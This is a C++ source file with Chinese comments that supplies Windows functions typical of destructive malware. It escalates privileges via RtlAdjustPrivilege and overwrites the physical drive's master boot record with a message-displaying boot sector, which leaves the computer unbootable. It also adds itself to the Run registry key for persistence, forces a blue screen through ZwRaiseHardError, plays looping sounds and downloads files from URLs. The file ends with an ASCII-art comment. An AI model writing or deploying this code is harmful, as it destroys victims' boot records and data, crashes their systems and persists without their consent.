#include"std.h"


using namespace std;

bool GetPrivileges()
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));//加载ntdll	
	if (ntdll == NULL)
		return false;
	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//获取提权函数	
	BOOLEAN ErrKill;
	bool retn = false;
	retn=((UINT32(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjPriv)(0x13, TRUE, FALSE, &ErrKill)<0xc0000000;//调用RtlAdjustPrivliege函数获取SeShutdownPrivilege权限
	FreeLibrary(ntdll);
	return retn;
}

//写MBR
bool WritePhydriveMBR(unsigned int id,const string& msgstr)
{
//	#pragma warning(push)
//	#pragma warning(disable:4309 4838)
	static BYTE pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
//	#pragma warning(pop)
	static bool isfirstuse = true;
	bool retn=true;
	if (isfirstuse)
	{
		//初始化MBR
		
		//改MBR中字符位数
		pMBR[9] = static_cast<BYTE>(msgstr.size());
		//加循环逻辑锁————已弃用！！！仅Win9x下有效果！！！
		//pMBR[0x1BF] = 0x00;
		//pMBR[0x1C2] = 0x05;
		//加结尾
		pMBR[510] = static_cast<BYTE>(0x55);
		pMBR[511] = static_cast<BYTE>(0xAA);
		//把提示字符写入MBR
		retn = strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr.c_str()) && retn;
		isfirstuse = false;
	}

	//计算硬盘文件名称
	wstringstream wss;
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//打开
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//用readfile来读取MBR
	retn = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
	CloseHandle(hFile);
	return retn;
}

//读MBR
string ReadPhydriveMBR(unsigned int id)
{
	
	char pMBR[512] = {};
	wstringstream wss;
	//计算硬盘文件名称
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//打开
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//用readfile来读取MBR
	DWORD dwReadSize;
	
	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
	CloseHandle(hFile);
	if (r_flag)
		return static_cast<string>(pMBR);
	else
		return static_cast<string>("");
}


//注册自启动
bool RegAutoStart(const wstring& name)
{
	HKEY hKey;
	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	//1、找到系统的启动项  
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项       
	{
		//2、得到本程序自身的全路径
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3、判断注册表项是否已经存在
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		//4、已经存在
		if (RegGetValue(hKey, nullptr, name.c_str(), RRF_RT_REG_SZ, 0, strDir, &nLength) != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			bool retn = false;
			//5、添加一个子Key,并设置值
			retn=RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS;
			//6、关闭注册表
			RegCloseKey(hKey);
			return retn;
		}
		else
			return true;
	}
	return false;
}

//蓝屏函数
bool MakeBlueScreen(unsigned int errid)
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
	if (ntdll != NULL)
	{
		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//获取蓝屏函数
		unsigned char ErrKill;
		long unsigned int HDErr;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
		FreeLibrary(ntdll);
	}
	return false;
}

//播放声音
bool PlaySoundFile(const wstring& soundname,bool sync)
{
	return PlaySound(soundname.c_str(), NULL, SND_FILENAME | SND_NODEFAULT | (sync ? SND_SYNC : SND_ASYNC) | SND_LOOP) == TRUE;
}

bool DownloadFileFromURL(const std::wstring& url, const std::wstring& filepath)
{
	return ((URLDownloadToFile(NULL, url.c_str(), filepath.c_str(), 0, NULL)) == S_OK);
}


//从URL获取字符串
std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
{
	CInternetSession session;
	CHttpFile* file = NULL;
	CString strURL = url.c_str();//URL
	CString strHtml = _T("");	//存放网页数据
	try
	{
		file = (CHttpFile*)session.OpenURL(strURL);
	}
	catch (CInternetException* m_pException)
	{
		file = NULL;
		m_pException->m_dwError;
		m_pException->Delete();
		session.Close();
		isok = false;
		return std::wstring();
	}

	CString strLine;

	if (file != NULL)
	{
		while (file->ReadString(strLine) != NULL)
		{
			strHtml += strLine;
		}
	}
	else
	{
		return std::wstring();
	}
	session.Close();
	file->Close();
	delete file;
	file = NULL;
	isok = true;
	return std::wstring(strHtml);
}

/*
鸡神保佑
程序安康
内存不溢出
+------------------------------------------------------------------------------------------------------------------------------------------------------+
|srssr  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, , ,												   |
|sirsrr,																						   													   |
|srssss2s:  ,,,,,,,,,,,,,,,,,,,, ,,,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,													   |
|srssssrssr,  ,,,,,,,,,,,,, , , ,,, ,,, ,,, , ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,,,,,,,,, ,,, , ,													   |
|srsrsrsrsssi,  ,,,,,,,,,, , ,,, , , , ,,, , ,,, , , ,,,,,,,,, , , ,,, , , ,,, ,,,,, ,,,,,,, , , ,													   |
|srssrrrrrrrssr,  ,,,,,,, , , , ,,, , , , , , ,,, ,,,,, , ,,,,,,,,,,, , , , ,,,,, , , ,,, , ,,,														   |
|srsrrrrrrrrrrssi,   , , , , , , , , , , , ,,, ,,, , , ,,, ,,,,, , , , , ,,,,,,, ,,, ,,, , , , ,													   |
|srssrsrrrrrrrrrssi    ,, , , , ,,, , , , , ,,, , , ,,, , , , ,,,,,,,,,,,,,,,,, , , , , , , , ,														   |
|::sssrrrrrrrrrrrrss:   ,, , , , , , , , , ,,,,, , , ,,, , , , , , , , ,,,,, , , , , , , , , , ,													   |
|,,:rssrrrrrrrrrrrrrss: , ,,, ,,, , , , , , , , , , ,,,,, ,           , , ,,, , , , ,,, , , , ,														   |
|:,:,:rsrrrrrrrririrrsr  , , , , , , , , , , , , , ,,, ,         ,:i:, ,,,,,,, , , , ,,, , , , ,													   |
|:,::,,:rrrrrrrirrrirrr   , , , , , , , , ,,,,,,, , ,,,   ,rs2G99MBBhi  , , , ,,, , , , , ,,, , ,													   |
|:,:::,,,:rsrrrrirrrisr  , , , , , , ,,, , , , , ,,, , , ,sMMMMGG9MBGs,  , ,,, , , , ,,,,, , ,,,													   |
|:,::::,:,,:rsrrrrrirrr   , , , ,,, , , , , , ,,, , ,,,,, isMM2:,isGBGr , , ,,,,, , , , , ,,,,, , ,													   |
|:,:::,:,,,,,:rsrrrrisr  , , , ,,, ,,,,, , , ,,, , , , ,    r2,:,i,:9:   ,,, , ,,,,,,, , , , , ,													   |
|:,::,:,:,:,,,,:rrrirrr , , , , , , , , , ,,, , , ,,, ,,,    :,,r: ,:       , ,,,,, , ,,, , , , ,													   |
|:,:::,:,:,,,,,,,irrrsr  , , , , , ,,, , , ,,, , ,,, , , ,    ,:,,,GBGhr       , , ,,, , ,,, , ,													   |
|:,::,:,:,,,:,,,,,,:rsr   , , , , ,,,,,,, ,,, ,,, , ,,,      iBMssBBMMBB r2     ,,, , ,,, , , , ,													   |
|, :::::,,,:,,,,,,,,,rr  , ,,, , , , , , , , ,,,,, ,,,    sB,sBBBBBGGBBB XBB9r   , , , ,,, , , , , ,												   |
|, ,,::::,,,,,,,,,,,,,:   , , , , , , ,,, , ,,, , ,,,   ,BBBX BBMGGGMMBM sBMBBh   ,,, ,,,,, , , ,													   |
|, , ,,:::,,,,,:,,,,,,,:,,   , , , , ,,, , , , ,,, ,   :BBMBB,XMGMMMGMBB sBMMBBs   , , ,,, , , , ,													   |
|, ,,,  ,::,,,,,,,,,,,,,::,,  , ,,,,, , , ,,, , , ,    BBMBBB,sBBMMMMMBB,rBMMMBB   ,,,,,, , , , , , ,												   |
|, ,,,,, ,,:::,:,,,,,,,,,:::,, , , , ,,, ,,,,, ,      XBMBBMBX,BBMMMMMMBr,BBMMMBs    ,,,,,,, , , , , ,                                               , |
|, ,,,,,,   ,::,:,:,,,,,,,,,::,,  , ,,,,, ,,,       ,MBBBBs GBrhBMMMMMMB9 BBBMBBBs    , ,,, , , , , ,                                               ,, |
|, ,,,,,,,,  ,,:::,,,,,,,,,,,:::,, , ,,, ,,,     ,GBBBBBBi   GBsBBMMMMMBB 2BBBBBBBM  , ,,,,, , ,,, , , ,   ,                           , ,     , , , , |
|, ,,,,,, ,,,   ,,:,,,:,,,,,:,:,::,   ,,, ,    :5BBBBBGs        :GBBBBBBBrsBB9,BBBBs  , , ,,, , , ,,,,, , ,   ,     ,   ,       , , , , , , ,,, , , ,, |
|, ,,,,,,, ,,,   ,,:,:,,,,,,,,,,,:::,  ,,,  ,rMBBBMSi      ,     :G99G9SX9S5h9 sBBBB,  , , , , , , , , , , , , , , , , , , , , , , ,,,,,,,,, ,,,,,,,,, |
|, ,,,,,,,,,,,,,,   ,::,,,,,,,,,,,:::,,     ,9BM9:      ,,,,,  r9S2sssss25Ss2Ms  sBBG   , ,,,,, ,,, ,,, ,,, ,,,,, ,,,,, ,,, , , , ,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,, ,,,   ,,:,:,:,,,,,,,:,:::,  ,:,i:,:::   ,,, ,   sG5s2sss222sss92   iBB5   ,,, ,,,,, , , , , ,,,,, , , , , , ,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,,,, ,,,  ,:::,,,,,,,,,:,:,:,,,rr:::iss2,  ,,,  ,r2sssssssssrrirsi    :BBi   ,,,,,,, , , , ,,,,,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,,,,,,,,   ,,:,:,,,,,,,,,,,:,iisirrrrr22  ,,  r5sssssss2SSsriii2,    :BBs  ,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,, ,,,,,,, ,  ,:::,:,,,,,:,:,,i2ssssssshs, ,  iXsssss29Mhr2Sriirs, ,   r,:,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,,,,,,,,,, ,   ,::::,:,,,,,,,,r9h522Shs,    ,2s2sss5GMi   rriirs  ,, ,, ir ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,, ,,,,,,,,, , ,  ,:::,:,,,,,,,,:ss2ss:,     sssss29Mh     :rrisr  ,,,,  r, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,, ,,,,,,,,,,,,,   ,::::,:,,,:,,,,,,,,     rsss25MMr   ,  :siirs  ,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,,,, , ,,,,,,,,,,,,, ,,:::,:,:,,,,,,,,,:,, :sss2XGs    ,,, s2sss2i ,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,, ,,,,,,,,,,,,,,,,,   ,::::,:,:,,,,,:,:,:22s2s92    , ,, ,S22s22  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
|, ,,,,,,,,,,,,,,,,,,,, ,,, ,,,,,,,,, ,,:::::,:,:,,,:,,:99559Gs   ,,,,,  ihsss5,  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,,,,,,,, , , ,,,,,,,,,,, , ,::::,:,:,:,:,,:299hXhS,  ,,,,,  2sss2, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
|, ,,,, , ,     ,   , ,     ,   ,          ,:,,,,,,,:,,,, i2h22h9,    ,   ss2s5,    , , ,   , , , , , , ,,, , , , , ,,, , ,,, ,,,,, ,,,,,,,,,,,,,,,,,,,|
|i,:::::::::::,:,,,,,:,,,:,:,,,,,,,,,,,,,,,,,:::::::::::::,,s92Shh, ,,,,, rSs22, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
|i:ii:i:::::::::::::::::::::::::::i:i:::i:i:i:i:i:::i:::i::,,s92Xh9i,,:::,22s22,::::i:i:::i:i:::i:::::::i:::::::::::i:i:::i:i:i:i:i:::i:i:iiiiiiiiririi|
|i,i::::::::::::::::::::::::::::::::::::::::::::::::::::::,:,,2G9952,r,,,iSssSs,,:::::::::,:::::::::::::::::,::::::::::::::::::::::::::::::i:i:::iiiir:|
|:,::::::::::::,:,:,:,:,:,:,:,:,:,:,:,:,,,:,:,:,:,,,:,:,:,:,:,,sr:MGBB: ,i2ssss ,,:,:,:,:,:::,:,:,:,:,:,:,:,:,:::::::,:::::,::::::::::::::::::::::::ii:|
|:,:::::,:::,:,:,:,:::,:,:,:,:,,,:,:,:,:,:,:,:,:::::,:,:,,,,,,   ,BBBBBi ,,:2Gs ,,,:,:,:,:,:,:,:,:,:::,:,:,:,:,:,:::::,:::::,:,:,::::::::::::::::::i:i,|
|:,::::,:,:,:::,,,:::,:,:,:,:,:::,:::,:,:::,:,:,:,:::,:,:,:,  ,,sBBBBBBB:  iBBG ,,:,:::::::::,:,:,:,:,:,:,:,:,:::,:,:,:,:,:,,,,,,,:,::::::::::::::::ii:|
|:,:::,:,:,:,,,:,:,:,,,:,,,,,,,:,:,,,,,:,:,:,:,,,:,:,,,:,:,,sBBBBBBBMBMG:, sMGG ,:,:::,:,:::::,:,:,:,:,:,:,:,:,:,:,:,:,:,:,,,:,:::,:,::::::::::::::i:i,|
|:,::::::,:::,:,:,:,:,:,:,:,:,:,:,:,:,:::,:::,:::,:,:,:::,:,s99hhsi,,,, ,, sM99,,,:,:::,:,:,:,:,,,:,:,,,:,:,:,,,,,:,:,,,:,:,:,:,:,::::::::::::::::::i::|
|: ,,,,,,,,,,,,,,,,,,,,, ,,, ,,, ,,,,, , ,,,,,,,,, ,,,,,,,,,       ,,,,,,, sSS9: ,,,,,,,,,,,,, , ,,, , , ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
+------------------------------------------------------------------------------------------------------------------------------------------------------+
*/